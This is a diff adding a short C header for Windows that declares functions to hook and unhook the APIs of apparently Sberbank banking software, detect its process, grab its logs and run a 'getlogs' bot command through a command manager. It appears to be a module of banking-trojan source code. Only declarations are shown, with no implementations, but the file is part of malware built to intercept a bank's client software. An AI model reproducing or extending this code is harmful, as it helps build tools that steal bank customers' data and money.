@@ -1,0 +1,20 @@
+#ifndef		SBERH
+#define		SBERH
+
+#include <windows.h>
+
+
+//*********************************************************************
+bool UnHookSber();
+
+//*********************************************************************
+bool HookSber();
+
+//*********************************************************************
+bool WINAPI IsSberProcess();
+bool HookSberApi();
+DWORD WINAPI grabsberlog();
+const char GetSberLog[] = "getlogs\0";
+bool ExecuteGrabSberLogCommand(LPVOID Manager, PCHAR Command, PCHAR Args);
+
+#endif		//SBERH
